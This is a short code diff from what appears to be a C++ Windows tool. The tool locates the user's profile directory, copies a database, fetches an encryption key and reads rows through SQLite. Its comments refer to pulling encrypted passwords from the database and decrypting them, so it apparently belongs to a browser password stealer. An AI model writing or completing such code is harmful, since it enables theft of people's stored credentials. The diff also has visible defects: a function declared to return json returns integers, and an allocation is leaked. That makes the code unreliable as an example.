@@ -133,9 +133,8 @@ static int callback(void *data, int argc, char **argv, char **azColName){
    return 0;
 }
 
-
-int main(){
-    HANDLE hToken =  GetCurrentProcessToken();
+json driver(){
+     HANDLE hToken =  GetCurrentProcessToken();
     DWORD lpcchSize = 30;
     LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
     if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
@@ -153,6 +152,7 @@ int main(){
    if (!CopyFile(db_path,temp, false)){
     printf("COPY FILE W FAILED \n");
     printf("Error: %d\n", GetLastError());
+    return -1;
    }
     PDATA_BLOB key = (PDATA_BLOB)malloc(sizeof(DATA_BLOB));
     key = GetEncryptionKey();
@@ -181,10 +181,8 @@ int main(){
 
 
    sqlite3_close(db);
-   
-   std::cout << test.dump();
-    
-    //BYTE * encrypted_password; //get from sqlite
-    //BYTE * password = getPassword(key->pbData , encrypted_password);
-       
+   return 0;
 }
+
+
+
